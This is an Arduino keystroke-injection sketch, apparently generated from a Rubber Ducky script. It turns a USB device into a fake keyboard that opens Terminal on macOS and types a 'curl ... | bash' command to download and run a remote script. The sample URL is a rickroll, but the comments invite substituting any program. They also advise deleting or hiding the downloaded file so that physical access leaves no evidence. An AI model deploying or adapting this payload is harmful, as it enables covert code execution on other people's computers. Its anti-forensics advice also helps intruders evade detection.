/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Title: OS X get and Execute
  // Author: Jesse Wallace (c0deous)
  // Simple script that downloads any file and runs it.
  // Requires duckencoder 2.6.3 which can be downloaded at http://goo.gl/QkTXNp
  // Note: you must put in your own specific code to execute
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(800);

  Keyboard.print("Terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash");

  typeKey(KEY_RETURN);

 

  

  // You can chage the above line to the command used to open your program.
  // Examples: python somescript.py , ./somescript.sh
  // Note: This script doesn't delete the downloaded file so it may leave evidence of physical access.  Delete it as quickly as possible after this runs.
  // Or alternatively you could hide it somewhere in a hidden folder where it won't be easily found.

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
